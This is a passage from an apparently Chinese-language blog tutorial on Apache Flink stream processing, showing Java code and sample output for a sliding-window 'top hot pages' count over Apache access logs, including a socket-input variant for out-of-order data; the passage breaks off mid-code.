class="line">(false,710777,6,2017-11-26T03:05,2)</span><br><span class="line">(true,3715112,6,2017-11-26T03:05,2)</span><br><span class="line">(false,724262,6,2017-11-26T03:05,3)</span><br><span class="line">(true,710777,6,2017-11-26T03:05,3)</span><br><span class="line">(false,1303734,5,2017-11-26T03:05,4)</span><br><span class="line">(true,724262,6,2017-11-26T03:05,4)</span><br><span class="line">(false,4622270,5,2017-11-26T03:05,5)</span><br><span class="line">(true,1303734,5,2017-11-26T03:05,5)</span><br><span class="line">(false,1303734,5,2017-11-26T03:05,5)</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="实时流量统计——热门页面"><a href="#实时流量统计——热门页面" class="headerlink" title="实时流量统计——热门页面"></a>实时流量统计——热门页面</h5><ul><li>基本需求 <ul><li>从web服务器的日志中，统计实时的热门访问页面</li><li>统计每分钟的ip访问量，取出访问量最大的5个地址，每5秒更新一次</li></ul></li><li>解决思路1 <ul><li>将apache服务器日志中的时间，转换为时间戳，作为Event Time</li><li>构建滑动窗口，窗口长度为1分钟，滑动距离为5秒</li></ul></li></ul><h6 id="POJO-1"><a href="#POJO-1" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> ApacheLogEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String ip;</span><br><span class="line"><span class="keyword">private</span> String userId;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br><span class="line"><span class="keyword">private</span> String method;</span><br><span class="line"><span class="keyword">private</span> String url;</span><br></pre></td></tr></table></figure></li><li><p> PageViewCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String url;</span><br><span class="line"><span class="keyword">private</span> Long windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-文件-1"><a href="#代码1-文件-1" class="headerlink" title="代码1-文件"></a>代码1-文件</h6><ul><li><p> Java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件，转换成POJO</span></span><br><span class="line">    URL resource = HotPages.class.getResource(<span class="string">&quot;/apache.log&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分组开窗聚合</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// 过滤get请求</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 按照url分组</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收集同一窗口count数据，排序输出</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义预聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态，保存当前所有PageViewCount到list中</span></span><br><span class="line">    ListState&lt;PageViewCount&gt; pageViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;PageViewCount&gt;(<span class="string">&quot;page-count-list&quot;</span>, PageViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState.add(value);</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 格式化成String输出</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;窗口结束时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历列表，取top n输出</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        PageViewCount pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; 页面URL = &quot;</span>).append(pageViewCount.getUrl())</span><br><span class="line">          .append(<span class="string">&quot; 浏览量 = &quot;</span>).append(pageViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 控制输出频率</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出结果  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:05:25.0</span><br><span class="line">NO 1: 页面URL = /blog/tags/puppet?flav=rss20 浏览量 = 2</span><br><span class="line">NO 2: 页面URL = /blog/geekery/eventdb-ideas.html 浏览量 = 1</span><br><span class="line">NO 3: 页面URL = /blog/geekery/installing-windows-8-consumer-preview.html 浏览量 = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:05:30.0</span><br><span class="line">NO 1: 页面URL = /blog/tags/puppet?flav=rss20 浏览量 = 2</span><br><span class="line">NO 2: 页面URL = /blog/geekery/eventdb-ideas.html 浏览量 = 1</span><br><span class="line">NO 3: 页面URL = /blog/geekery/installing-windows-8-consumer-preview.html 浏览量 = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:05:35.0</span><br><span class="line">NO 1: 页面URL = /blog/tags/puppet?flav=rss20 浏览量 = 2</span><br><span class="line">NO 2: 页面URL = /blog/tags/firefox?flav=rss20 浏览量 = 2</span><br><span class="line">NO 3: 页面URL = /blog/geekery/eventdb-ideas.html 浏览量 = 1</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-乱序数据测试"><a href="#代码2-乱序数据测试" class="headerlink" title="代码2-乱序数据测试"></a>代码2-乱序数据测试</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件，转换成POJO</span></span><br><span class="line">    <span class="comment">//        URL resource = HotPages.class.getResource(&quot;/apache.log&quot;);</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方便测试，使用本地Socket输入数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    dataStream.print(<span class="string">&quot;data&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个侧输出流标签</span></span><br><span class="line">    OutputTag&lt;ApacheLogEvent&gt; lateTag = <span class="keyword">new</span> 